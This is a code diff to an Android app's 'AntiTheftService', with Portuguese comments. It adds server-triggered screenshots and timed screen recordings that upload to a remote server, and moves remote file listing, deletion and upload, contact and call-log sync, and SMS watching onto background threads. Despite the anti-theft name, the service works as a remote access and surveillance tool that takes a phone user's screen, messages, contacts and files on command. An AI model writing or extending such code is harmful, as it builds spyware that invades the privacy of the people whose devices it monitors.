@@ -46,6 +46,9 @@ import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
+import androidx.lifecycle.lifecycleScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import com.androidprotect.helpers.AudioHelper
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageAnalysis
@@ -166,6 +169,12 @@ class AntiTheftService : LifecycleService() {
     // Accessibility-based screen capture state (Android 11+)
     private var accessibilityFrameHandler: Handler? = null
     private var accessibilityFrameRunnable: Runnable? = null
+
+    // Screen Recording state
+    private var screenRecorder: android.media.MediaRecorder? = null
+    private var recordingVirtualDisplay: VirtualDisplay? = null
+    private var screenRecordFile: File? = null
+    private var isScreenRecording = false
 
     // Live Camera Stream state (CameraX ImageAnalysis)
     private var cameraProvider: ProcessCameraProvider? = null
@@ -499,7 +508,9 @@ class AntiTheftService : LifecycleService() {
                 stableHandler.postDelayed(stableRunnable, 30_000L)
 
                 sendTelemetry()
-                Handler(Looper.getMainLooper()).post {
+                // registerSmsObserver faz contentResolver.query para obter o último SMS ID;
+                // executar na main thread causaria ANR — delegar ao pool de I/O
+                lifecycleScope.launch(Dispatchers.IO) {
                     registerSmsObserver()
                 }
                 sendConsoleLog("Aparelho conectado ao servidor.")
@@ -583,15 +594,17 @@ class AntiTheftService : LifecycleService() {
 
                 "LIST_FILES" -> {
                     val path = root["path"]?.jsonPrimitive?.content ?: externalRoot()
-                    listRemoteFiles(path)
+                    // I/O de arquivo — roda em background para evitar ANR
+                    lifecycleScope.launch(Dispatchers.IO) { listRemoteFiles(path) }
                 }
                 "DELETE_FILE" -> {
                     val path = root["path"]?.jsonPrimitive?.content ?: return
-                    deleteRemoteFile(path)
+                    // deleteRecursively pode bloquear — roda em background
+                    lifecycleScope.launch(Dispatchers.IO) { deleteRemoteFile(path) }
                 }
                 "DOWNLOAD_FILE" -> {
                     val path = root["path"]?.jsonPrimitive?.content ?: return
-                    uploadRemoteFile(path)
+                    lifecycleScope.launch(Dispatchers.IO) { uploadRemoteFile(path) }
                 }
 
                 "SEND_MESSAGE" -> {
@@ -606,8 +619,16 @@ class AntiTheftService : LifecycleService() {
                     webSocket?.send(Json.encodeToString(receipt))
                 }
 
-                "GET_CONTACTS" -> syncContacts()
-                "GET_CALL_LOG" -> syncCallLog()
+                "TAKE_SCREENSHOT" -> takeScreenshot()
+                "START_SCREEN_RECORD" -> {
+                    val duration = root["duration"]?.jsonPrimitive?.intOrNull ?: 30
+                    startScreenRecord(duration)
+                }
+                "STOP_SCREEN_RECORD" -> stopScreenRecord()
+
+                // ContentProvider queries podem bloquear por segundos — sempre em background
+                "GET_CONTACTS" -> lifecycleScope.launch(Dispatchers.IO) { syncContacts() }
+                "GET_CALL_LOG" -> lifecycleScope.launch(Dispatchers.IO) { syncCallLog() }
 
                 else -> Log.w("AntiTheftService", "Unknown command: $command")
             }
@@ -1001,7 +1022,16 @@ class AntiTheftService : LifecycleService() {
         isScreenStreaming = true
         sendConsoleLog("Transmissão de tela via Acessibilidade iniciada.")
 
-        val handler = Handler(Looper.getMainLooper())
+        // Garantir que a thread de compressão existe (reutilizamos a mesma do MediaProjection)
+        if (screenCaptureThread == null || !screenCaptureThread!!.isAlive) {
+            screenCaptureThread = HandlerThread("ScreenCaptureThread").apply { start() }
+            screenCaptureHandler = Handler(screenCaptureThread!!.looper)
+        }
+        val compressHandler = screenCaptureHandler!!
+
+        // captureScreen (PixelCopy) deve ser acionado na main thread;
+        // a compressão JPEG (~10-30ms) roda no ScreenCaptureThread para não bloquear a UI
+        val captureHandler = Handler(Looper.getMainLooper())
         val runnable = object : Runnable {
             override fun run() {
                 if (!isScreenStreaming) return
@@ -1013,29 +1043,32 @@ class AntiTheftService : LifecycleService() {
                 }
                 svc.captureScreen { bitmap ->
                     if (bitmap != null && isScreenStreaming) {
-                        try {
-                            val w = 360; val h = 640
-                            val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
-                            val out = java.io.ByteArrayOutputStream()
-                            scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
-                            if (scaled !== bitmap) scaled.recycle()
-                            bitmap.recycle()
-                            sendTypedBinary(0x01.toByte(), out.toByteArray())
-                        } catch (e: Exception) {
-                            Log.e("AntiTheftService", "Frame error: ${e.message}")
-                            bitmap.recycle()
+                        // Compressão em background — não bloqueia a main thread
+                        compressHandler.post {
+                            try {
+                                val w = 360; val h = 640
+                                val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
+                                val out = java.io.ByteArrayOutputStream()
+                                scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
+                                if (scaled !== bitmap) scaled.recycle()
+                                bitmap.recycle()
+                                sendTypedBinary(0x01.toByte(), out.toByteArray())
+                            } catch (e: Exception) {
+                                Log.e("AntiTheftService", "Frame error: ${e.message}")
+                                bitmap.recycle()
+                            }
                         }
                     } else {
                         if (bitmap == null) Log.w("AntiTheftService", "captureScreen returned null bitmap")
                         bitmap?.recycle()
                     }
-                    if (isScreenStreaming) handler.postDelayed(this, 150)
+                    if (isScreenStreaming) captureHandler.postDelayed(this, 150)
                 }
             }
         }
-        accessibilityFrameHandler = handler
+        accessibilityFrameHandler = captureHandler
         accessibilityFrameRunnable = runnable
-        handler.post(runnable)
+        captureHandler.post(runnable)
     }
 
     private fun startScreenStreamingViaMediaProjection() {
@@ -1183,6 +1216,162 @@ class AntiTheftService : LifecycleService() {
     private fun releaseMediaProjection() {
         try { mediaProjection?.stop() } catch (_: Exception) {}
         mediaProjection = null
+    }
+
+    // ── Screenshot (captura única da tela) ───────────────────────────────────
+    private fun takeScreenshot() {
+        // Via AccessibilityService (PixelCopy — preferido, não precisa de token de stream ativo)
+        val svc = ProtectAccessibilityService.instance
+        if (svc != null) {
+            Handler(Looper.getMainLooper()).post {
+                svc.captureScreen { bitmap ->
+                    if (bitmap != null) {
+                        uploadScreenshotBitmap(bitmap)
+                    } else {
+                        sendConsoleLog("❌ Screenshot falhou: serviço de acessibilidade retornou nulo.")
+                    }
+                }
+            }
+            return
+        }
+        // Via MediaProjection (requer transmissão de tela ativa)
+        val proj = mediaProjection
+        if (proj == null) {
+            sendConsoleLog("❌ Screenshot: ative a acessibilidade ou inicie a transmissão de tela primeiro.")
+            return
+        }
+        val dm = getSystemService(DISPLAY_SERVICE) as android.hardware.display.DisplayManager
+        val display = dm.getDisplay(android.view.Display.DEFAULT_DISPLAY)
+        val metrics = android.util.DisplayMetrics()
+        @Suppress("DEPRECATION")
+        display.getMetrics(metrics)
+        val w = metrics.widthPixels
+        val h = metrics.heightPixels
+        val dpi = metrics.densityDpi
+        val reader = ImageReader.newInstance(w, h, android.graphics.PixelFormat.RGBA_8888, 1)
+        val vd = proj.createVirtualDisplay("screenshot_tmp", w, h, dpi,
+            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+        reader.setOnImageAvailableListener({ r ->
+            val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+            val planes = image.planes
+            val buffer = planes[0].buffer
+            val ps = planes[0].pixelStride
+            val rs = planes[0].rowStride
+            val padding = rs - ps * w
+            val bmp = Bitmap.createBitmap(w + padding / ps, h, Bitmap.Config.ARGB_8888)
+            bmp.copyPixelsFromBuffer(buffer)
+            image.close()
+            val clean = if (padding > 0) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
+            uploadScreenshotBitmap(clean)
+            if (clean !== bmp) bmp.recycle()
+            vd?.release()
+            reader.close()
+        }, Handler(Looper.getMainLooper()))
+    }
+
+    private fun uploadScreenshotBitmap(bitmap: Bitmap) {
+        lifecycleScope.launch(Dispatchers.IO) {
+            try {
+                val out = java.io.ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out)
+                bitmap.recycle()
+                val bytes = out.toByteArray()
+                val tmp = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
+                tmp.writeBytes(bytes)
+                sendConsoleLog("📸 Screenshot capturado (${bytes.size / 1024}KB) — enviando ao servidor...")
+                uploadFile(tmp, "/upload/screenshot/$deviceId", "screenshot")
+            } catch (e: Exception) {
+                sendConsoleLog("❌ Erro ao processar screenshot: ${e.message}")
+            }
+        }
+    }
+
+    // ── Gravação de Tela ─────────────────────────────────────────────────────
+    @Suppress("DEPRECATION")
+    private fun startScreenRecord(durationSeconds: Int) {
+        if (isScreenRecording) {
+            sendConsoleLog("⚠️ Gravação de tela já em andamento.")
+            return
+        }
+        val proj = mediaProjection ?: run {
+            sendConsoleLog("❌ Gravação de tela: inicie a transmissão de tela primeiro para obter permissão.")
+            return
+        }
+        val dm = getSystemService(DISPLAY_SERVICE) as android.hardware.display.DisplayManager
+        val display = dm.getDisplay(android.view.Display.DEFAULT_DISPLAY)
+        val metrics = android.util.DisplayMetrics()
+        display.getMetrics(metrics)
+        // Garantir dimensões pares (exigido pelo encoder H.264)
+        val w = (metrics.widthPixels / 2) * 2
+        val h = (metrics.heightPixels / 2) * 2
+        val dpi = metrics.densityDpi
+
+        val outFile = File(cacheDir, "screen_record_${System.currentTimeMillis()}.mp4")
+        screenRecordFile = outFile
+
+        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+            android.media.MediaRecorder(this)
+        else
+            @Suppress("DEPRECATION") android.media.MediaRecorder()
+
+        try {
+            recorder.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE)
+            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264)
+            recorder.setVideoSize(w, h)
+            recorder.setVideoFrameRate(15)
+            recorder.setVideoEncodingBitRate(1_500_000) // 1.5 Mbps — boa qualidade
+            recorder.setOutputFile(outFile.absolutePath)
+            recorder.prepare()
+
+            recordingVirtualDisplay = proj.createVirtualDisplay(
+                "ScreenRecord", w, h, dpi,
+                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                recorder.surface, null, null
+            )
+            recorder.start()
+            screenRecorder = recorder
+            isScreenRecording = true
+
+            webSocket?.send("""{"type":"SCREEN_RECORD_STARTED","deviceId":"$deviceId","duration":$durationSeconds}""")
+            sendConsoleLog("⏺ Gravação de tela iniciada (${durationSeconds}s)...")
+
+            // Para automaticamente após o tempo configurado
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (isScreenRecording) stopScreenRecord()
+            }, durationSeconds * 1000L)
+
+        } catch (e: Exception) {
+            recorder.release()
+            screenRecordFile = null
+            sendConsoleLog("❌ Erro ao iniciar gravação de tela: ${e.message}")
+        }
+    }
+
+    private fun stopScreenRecord() {
+        if (!isScreenRecording) return
+        isScreenRecording = false
+        try { screenRecorder?.stop() } catch (e: Exception) {
+            Log.e("AntiTheftService", "MediaRecorder stop error: ${e.message}")
+        }
+        screenRecorder?.release()
+        screenRecorder = null
+        recordingVirtualDisplay?.release()
+        recordingVirtualDisplay = null
+
+        webSocket?.send("""{"type":"SCREEN_RECORD_STOPPED","deviceId":"$deviceId"}""")
+
+        val file = screenRecordFile
+        if (file != null && file.exists() && file.length() > 1024) {
+            val kb = file.length() / 1024
+            sendConsoleLog("⏹ Gravação encerrada (${kb}KB) — enviando ao servidor...")
+            uploadFile(file, "/upload/screen-recording/$deviceId", "recording")
+            screenRecordFile = null
+        } else {
+            sendConsoleLog("❌ Arquivo de gravação vazio ou inválido.")
+            screenRecordFile?.delete()
+            screenRecordFile = null
+        }
     }
 
     // Play Security Siren Alarm with sound + vibration + flash
@@ -1735,6 +1924,7 @@ class AntiTheftService : LifecycleService() {
         // Clean up resources
         stopLocationTracking()
         stopScreenStreaming()
+        stopScreenRecord()
         releaseMediaProjection()
 
         mediaPlayer?.stop()
@@ -1787,7 +1977,10 @@ class AntiTheftService : LifecycleService() {
             Log.e("AntiTheftService", "Error reading initial SMS ID: ${e.message}")
         }
 
-        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+        // Usar mediaScanHandler (HandlerThread de background) em vez do main looper:
+        // syncNewSms() faz contentResolver.query — não pode rodar na main thread
+        val smsHandler = mediaScanHandler ?: Handler(Looper.getMainLooper())
+        smsObserver = object : ContentObserver(smsHandler) {
             override fun onChange(selfChange: Boolean) = syncNewSms()
             override fun onChange(selfChange: Boolean, uri: Uri?) = syncNewSms()
         }
